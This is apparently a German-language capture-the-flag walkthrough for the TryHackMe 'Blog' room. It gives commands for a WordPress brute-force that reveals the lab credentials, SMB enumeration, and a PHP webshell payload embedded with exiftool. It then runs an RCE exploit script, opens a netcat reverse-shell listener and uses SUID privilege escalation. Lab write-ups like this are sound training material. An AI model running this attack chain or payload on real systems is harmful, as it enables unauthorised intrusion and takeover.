
# TryHackMe: Blog

## 1. Vorbereitung
```bash
gem install wpscan
```
- Installiert **wpscan** auf der AttackBox.

```bash
wpscan --url https://bricks.thm/
```
- Scannt die Zielseite nach Schwachstellen.
  - WordPress-Version: **5.0** (veraltet & anfällig)
  - **XML-RPC aktiv**: `http://blog.thm/xmlrpc.php`
    - Ermöglicht Brute-Force-Angriffe, wenn Nutzer bekannt sind.

---

## 2. Port-Scan mit Nmap
```bash
nmap -sS 10.10.234.16
```
- Übersicht der offenen Ports:
  - `22/tcp`  → SSH (OpenSSH 7.6p1)
  - `80/tcp`  → HTTP (Apache 2.4.29)
  - `139/tcp` → Samba (netbios-ssn)
  - `445/tcp` → Samba (netbios-ssn)

---

## 3. WordPress Benutzer identifizieren
```bash
auxiliary/scanner/http/wordpress_scanner
```
- Erkennt zwei Benutzer:
  - `bjoel` (Billy Joel)
  - `kwheel` (Karen Wheeler)

---

## 4. SMB Enumeration & Dateien extrahieren
```bash
apt install smbmap
```
- Installiert **smbmap** zur Enumeration von SMB-Shares.

```bash
smbmap -H 10.10.234.16
```
- Verfügbare Freigaben:
  - `BillySMB` → **READ, WRITE**
  - `print$`, `IPC$` → kein Zugriff

```bash
smbget smb://10.10.234.16/BillySMB -R
```
- Lädt alle Dateien aus der Freigabe:
  - `Alice-White-Rabbit.jpg`
  - `tswift.mp4`
  - `check-this.png`

---

## 5. Steganographie mit steghide
```bash
steghide --info Alice-White-Rabbit.jpg
```
- Erkennt eingebettete Datei: `rabbit_hole.txt`

```bash
steghide extract -sf Alice-White-Rabbit.jpg
```
- Extrahiert `rabbit_hole.txt`
  - Inhalt ist **unbrauchbar** / Müll

---

## 6. WordPress Brute-Force
```bash
echo -e "bjoel\nkwheel" > users.txt
```
- Erstellt eine Liste der Nutzer.

```bash
wpscan --url http://blog.thm --usernames users.txt --passwords /usr/share/wordlists/rockyou.txt
```
- Brute-Force Angriff:
  - ✅ Zugang gefunden: `kwheel` / `cutiepie1`

---

## 7. Remote Code Execution (RCE)

**Exploit:**  
[exploit-db.com/exploits/46662](https://www.exploit-db.com/exploits/46662)

```bash
exiftool gd.jpg -CopyrightNotice="<?=\`\$_GET[0]\`?>"
```
- Fügt PHP-Code in ein Bild ein (für Webshell via GET-Parameter).

```bash
python3 49512.py http://blog.thm/ kwheel cutiepie1 twentytwenty
```
- Führt den Exploit aus.

```bash
nc -lvnp 4141
```
- Startet den Netcat Listener.

---

## 8. Privilege Escalation

```bash
find / -perm /4000 2> /dev/null
```
- Findet Dateien mit **SUID-Bit** (werden mit Root-Rechten ausgeführt).

```bash
strings <Datei>
```
- Zeigt lesbare Zeichenketten in einer Datei an.

```bash
admin=1
export admin
```
- Setzt die Umgebungsvariable `admin`.
- Danach kann das Programm **checker** erfolgreich ausgeführt werden.

---
